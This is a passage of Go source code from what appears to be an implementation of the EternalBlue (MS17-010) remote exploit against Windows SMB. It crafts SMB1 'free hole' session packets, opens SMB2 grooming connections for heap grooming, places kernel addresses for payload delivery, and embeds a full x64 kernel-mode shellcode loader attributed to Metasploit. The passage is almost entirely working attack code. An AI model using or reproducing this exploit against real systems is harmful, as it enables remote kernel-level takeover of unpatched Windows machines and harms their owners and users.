		buf.Write(bytes.Repeat([]byte{0x41}, 4096))
	}
	return buf.Bytes()
}

func makeSMB1EchoPacket(treeID, userID uint16) []byte {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x00, 0x31})

	// --------Server Message Block Protocol--------
	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Echo
	buf.WriteByte(0x2B)
	// NT success
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x07, 0xC0})
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// user id
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------Echo Request--------

	// word count
	buf.WriteByte(0x01)
	// echo count
	buf.Write([]byte{0x01, 0x00})
	// byte count
	buf.Write([]byte{0x0C, 0x00})
	// echo data
	// this is an existing IDS signature, and can be null out
	buf.Write([]byte{0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00})

	return buf.Bytes()
}

func smb1FreeHole(address string, start bool) (net.Conn, error) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return nil, fmt.Errorf("failed to connect host: %s", err)
	}
	var ok bool
	defer func() {
		if !ok {
			_ = conn.Close()
		}
	}()
	err = smbClientNegotiate(conn)
	if err != nil {
		return nil, fmt.Errorf("failed to negotiate: %s", err)
	}
	var (
		flags2   []byte
		vcNum    []byte
		nativeOS []byte
	)
	if start {
		flags2 = []byte{0x07, 0xC0}
		vcNum = []byte{0x2D, 0x01}
		nativeOS = []byte{0xF0, 0xFF, 0x00, 0x00, 0x00}
	} else {
		flags2 = []byte{0x07, 0x40}
		vcNum = []byte{0x2C, 0x01}
		nativeOS = []byte{0xF8, 0x87, 0x00, 0x00, 0x00}
	}
	packet := makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS)
	_, err = conn.Write(packet)
	if err != nil {
		const format = "failed to send smb1 free hole session packet: %s"
		return nil, fmt.Errorf(format, err)
	}
	_, _, err = smb1GetResponse(conn)
	if err != nil {
		return nil, err
	}
	ok = true
	return conn, nil
}

func makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS []byte) []byte {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x00, 0x51})

	// --------Server Message Block Protocol--------
	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Session Setup AndX
	buf.WriteByte(0x73)
	// NT success
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write(flags2)
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	buf.Write([]byte{0x00, 0x00})
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// user id
	buf.Write([]byte{0x00, 0x00})
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------Session Setup AndX Request--------

	// word count
	buf.WriteByte(0x0C)
	// no further commands
	buf.WriteByte(0xFF)
	// reserved
	buf.WriteByte(0x00)
	// AndX offset
	buf.Write([]byte{0x00, 0x00})
	// max buffer
	buf.Write([]byte{0x04, 0x11})
	// max mpx count
	buf.Write([]byte{0x0A, 0x00})
	// VC number
	buf.Write(vcNum)
	// session key
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// security blob length
	buf.Write([]byte{0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// capabilities
	buf.Write([]byte{0x00, 0x00, 0x00, 0x80})
	// byte count
	buf.Write([]byte{0x16, 0x00})
	// Native OS
	buf.Write(nativeOS)
	// extra byte params
	buf.Write(makeZero(17))
	return buf.Bytes()
}

func smb2Grooms(address string, grooms int) ([]net.Conn, error) {
	header := makeSMB2Header()
	var (
		conns []net.Conn
		ok    bool
	)
	defer func() {
		if ok {
			return
		}
		for i := 0; i < len(conns); i++ {
			_ = conns[i].Close()
		}
	}()
	for i := 0; i < grooms; i++ {
		conn, err := net.Dial("tcp", address)
		if err != nil {
			return nil, fmt.Errorf("failed to connect target: %s", err)
		}
		_, err = conn.Write(header)
		if err != nil {
			return nil, fmt.Errorf("failed to send SMB2 header: %s", err)
		}
		conns = append(conns, conn)
	}
	ok = true
	return conns, nil
}

func makeSMB2Header() []byte {
	buf := bytes.Buffer{}
	buf.Write([]byte{0x00, 0x00, 0xFF, 0xF7, 0xFE})
	buf.WriteString("SMB")
	buf.Write(makeZero(124))
	return buf.Bytes()
}

const (
	packetMaxLen   = 4204
	packetSetupLen = 497
)

func makeSMB2Body(payload []byte) []byte {
	const packetMaxPayload = packetMaxLen - packetSetupLen
	// padding
	buf := bytes.Buffer{}
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x03, 0x00, 0x00, 0x00})
	buf.Write(makeZero(0x1C))
	buf.Write([]byte{0x03, 0x00, 0x00, 0x00})
	buf.Write(makeZero(0x74))

	// KI_USER_SHARED_DATA addresses
	x64Address := []byte{0xb0, 0x00, 0xd0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	buf.Write(bytes.Repeat(x64Address, 2))
	buf.Write(makeZero(0x10))
	x86Address := []byte{0xC0, 0xF0, 0xDF, 0xFF}
	buf.Write(bytes.Repeat(x86Address, 2))
	buf.Write(makeZero(0xC4))

	// payload address
	buf.Write([]byte{0x90, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x04))
	buf.Write([]byte{0xF0, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x40))

	buf.Write([]byte{0xF0, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x00, 0x02, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.WriteByte(0x00)

	// set payload
	buf.Write(payload)

	// fill out the rest, this can be randomly generated
	buf.Write(makeZero(packetMaxPayload - len(payload)))

	return buf.Bytes()
}

func makeZero(size int) []byte {
	return bytes.Repeat([]byte{0}, size)
}

// loader is used to run user mode sc in the kernel mode.
// reference Metasploit-Framework:
// file: msf/external/source/sc/windows/multi_arch_kernel_queue_apc.asm
// binary: modules/exploits/windows/smb/ms17_010_eternalblue.rb: def make_kernel_sc
var loader = [...]byte{
	0x31, 0xC9, 0x41, 0xE2, 0x01, 0xC3, 0xB9, 0x82, 0x00, 0x00, 0xC0, 0x0F, 0x32, 0x48, 0xBB, 0xF8,
	0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x53, 0x04, 0x89, 0x03, 0x48, 0x8D, 0x05, 0x0A,
	0x00, 0x00, 0x00, 0x48, 0x89, 0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x0F, 0x30, 0xC3, 0x0F, 0x01, 0xF8,
	0x65, 0x48, 0x89, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x24, 0x25, 0xA8, 0x01,
	0x00, 0x00, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
	0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x6A, 0x2B, 0x65, 0xFF, 0x34, 0x25, 0x10,
	0x00, 0x00, 0x00, 0x41, 0x53, 0x6A, 0x33, 0x51, 0x4C, 0x89, 0xD1, 0x48, 0x83, 0xEC, 0x08, 0x55,
	0x48, 0x81, 0xEC, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48,
	0x89, 0x9D, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB5,
	0xD0, 0x00, 0x00, 0x00, 0x48, 0xA1, 0xF8, 0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x89,
	0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x48, 0x31, 0xDB, 0xFF, 0xCB, 0x48, 0x21, 0xD8, 0xB9, 0x82, 0x00,
	0x00, 0xC0, 0x0F, 0x30, 0xFB, 0xE8, 0x38, 0x00, 0x00, 0x00, 0xFA, 0x65, 0x48, 0x8B, 0x24, 0x25,
	0xA8, 0x01, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
	0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0x65,
	0x48, 0x8B, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x0F, 0x01, 0xF8, 0xFF, 0x24, 0x25, 0xF8, 0x0F,
	0xD0, 0xFF, 0x56, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53, 0x55, 0x48, 0x89, 0xE5,
	0x66, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8D, 0x35, 0xE3, 0xFF, 0xFF, 0xFF, 0x65,
	0x4C, 0x8B, 0x3C, 0x25, 0x38, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x7F, 0x04, 0x49, 0xC1, 0xEF, 0x0C,
	0x49, 0xC1, 0xE7, 0x0C, 0x49, 0x81, 0xEF, 0x00, 0x10, 0x00, 0x00, 0x49, 0x8B, 0x37, 0x66, 0x81,
	0xFE, 0x4D, 0x5A, 0x75, 0xEF, 0x41, 0xBB, 0x5C, 0x72, 0x11, 0x62, 0xE8, 0x18, 0x02, 0x00, 0x00,
	0x48, 0x89, 0xC6, 0x48, 0x81, 0xC6, 0x08, 0x03, 0x00, 0x00, 0x41, 0xBB, 0x7A, 0xBA, 0xA3, 0x30,
	0xE8, 0x03, 0x02, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x39, 0xF0, 0x77, 0x11, 0x48, 0x8D, 0x90,
	0x00, 0x05, 0x00, 0x00, 0x48, 0x39, 0xF2, 0x72, 0x05, 0x48, 0x29, 0xC6, 0xEB, 0x08, 0x48, 0x8B,
	0x36, 0x48, 0x39, 0xCE, 0x75, 0xE2, 0x49, 0x89, 0xF4, 0x31, 0xDB, 0x89, 0xD9, 0x83, 0xC1, 0x04,
	0x81, 0xF9, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x8D, 0x66, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0x89,
	0xCB, 0x41, 0xBB, 0x66, 0x55, 0xA2, 0x4B, 0xE8, 0xBC, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x75, 0xDB,
	0x49, 0x8B, 0x0E, 0x41, 0xBB, 0xA3, 0x6F, 0x72, 0x2D, 0xE8, 0xAA, 0x01, 0x00, 0x00, 0x48, 0x89,
	0xC6, 0xE8, 0x50, 0x01, 0x00, 0x00, 0x41, 0x81, 0xF9, 0xBF, 0x77, 0x1F, 0xDD, 0x75, 0xBC, 0x49,
	0x8B, 0x1E, 0x4D, 0x8D, 0x6E, 0x10, 0x4C, 0x89, 0xEA, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0xE5, 0x24,
	0x11, 0xDC, 0xE8, 0x81, 0x01, 0x00, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x8D,
	0x4E, 0x08, 0x49, 0xC7, 0x01, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0xF2, 0x31,
	0xC9, 0x48, 0x89, 0x0A, 0x48, 0xF7, 0xD1, 0x41, 0xBB, 0x4B, 0xCA, 0x0A, 0xEE, 0x48, 0x83, 0xEC,
	0x20, 0xE8, 0x52, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x49, 0x8B,
	0x3E, 0x48, 0x8D, 0x35, 0xE9, 0x00, 0x00, 0x00, 0x31, 0xC9, 0x66, 0x03, 0x0D, 0xD7, 0x01, 0x00,
	0x00, 0x66, 0x81, 0xC1, 0xF9, 0x00, 0xF3, 0xA4, 0x48, 0x89, 0xDE, 0x48, 0x81, 0xC6, 0x08, 0x03,
	0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x8B, 0x11, 0x4C, 0x29, 0xE2, 0x51, 0x52, 0x48, 0x89, 0xD1,
	0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x26, 0x40, 0x36, 0x9D, 0xE8, 0x09, 0x01, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x20, 0x5A, 0x59, 0x48, 0x85, 0xC0, 0x74, 0x18, 0x48, 0x8B, 0x80, 0xC8, 0x02, 0x00,
	0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x83, 0xC2, 0x4C, 0x8B, 0x02, 0x0F, 0xBA, 0xE0, 0x05,
	0x72, 0x05, 0x48, 0x8B, 0x09, 0xEB, 0xBE, 0x48, 0x83, 0xEA, 0x4C, 0x49, 0x89, 0xD4, 0x31, 0xD2,
	0x80, 0xC2, 0x90, 0x31, 0xC9, 0x41, 0xBB, 0x26, 0xAC, 0x50, 0x91, 0xE8, 0xC8, 0x00, 0x00, 0x00,
	0x48, 0x89, 0xC1, 0x4C, 0x8D, 0x89, 0x80, 0x00, 0x00, 0x00, 0x41, 0xC6, 0x01, 0xC3, 0x4C, 0x89,
	0xE2, 0x49, 0x89, 0xC4, 0x4D, 0x31, 0xC0, 0x41, 0x50, 0x6A, 0x01, 0x49, 0x8B, 0x06, 0x50, 0x41,
	0x50, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xAC, 0xCE, 0x55, 0x4B, 0xE8, 0x98, 0x00, 0x00, 0x00,
	0x31, 0xD2, 0x52, 0x52, 0x41, 0x58, 0x41, 0x59, 0x4C, 0x89, 0xE1, 0x41, 0xBB, 0x18, 0x38, 0x09,
	0x9E, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x41, 0xBB, 0x22, 0xB7, 0xB3, 0x7D, 0xE8,
	0x74, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0x0D, 0xE2, 0x4D, 0x85, 0xE8, 0x66, 0x00,
	0x00, 0x00, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5E,
	0xC3, 0xE9, 0xB5, 0x00, 0x00, 0x00, 0x4D, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D,
	0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xEC, 0xC3, 0x31, 0xD2,
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x12,
	0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x45, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xEE, 0x45, 0x39,
	0xD9, 0x75, 0xDA, 0x4C, 0x8B, 0x7A, 0x20, 0xC3, 0x4C, 0x89, 0xF8, 0x41, 0x51, 0x41, 0x50, 0x52,
	0x51, 0x56, 0x48, 0x89, 0xC2, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00,
	0x00, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0x48,
	0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0xE8, 0x78, 0xFF, 0xFF, 0xFF, 0x45, 0x39,
	0xD9, 0x75, 0xEC, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48,
	0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x5E, 0x59,
	0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5B, 0x41, 0x53, 0xFF, 0xE0, 0x56, 0x41, 0x57, 0x55, 0x48,
	0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xDA, 0x16, 0xAF, 0x92, 0xE8, 0x4D, 0xFF, 0xFF,
	0xFF, 0x31, 0xC9, 0x51, 0x51, 0x51, 0x51, 0x41, 0x59, 0x4C, 0x8D, 0x05, 0x1A, 0x00, 0x00, 0x00,
	0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x46, 0x45, 0x1B, 0x22, 0xE8, 0x68, 0xFF, 0xFF, 0xFF,
	0x48, 0x89, 0xEC, 0x5D, 0x41, 0x5F, 0x5E, 0xC3,
}
